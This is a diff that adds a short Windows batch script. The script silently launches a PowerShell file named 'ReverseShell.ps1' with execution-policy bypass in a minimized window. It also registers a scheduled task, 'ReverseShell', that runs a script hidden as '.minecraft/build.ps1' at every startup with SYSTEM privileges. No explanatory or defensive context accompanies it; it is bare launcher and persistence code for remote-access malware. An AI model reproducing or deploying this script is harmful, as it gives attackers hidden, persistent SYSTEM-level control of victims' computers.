@@ -1,0 +1,4 @@
+set DESK=%USERPROFILE%\Desktop
+cd %DESK%
+cmd /c start /min cmd /c "powershell.exe -ExecutionPolicy Bypass -File 'C:\Users\User\Desktop\ReverseShell.ps1'"
+cmd /c start /min cmd /c "schtasks /create /tn "ReverseShell" /tr "powershell.exe -ExecutionPolicy Bypass -File '.minecraft/build.ps1'" /sc ONSTART /ru SYSTEM & pause"
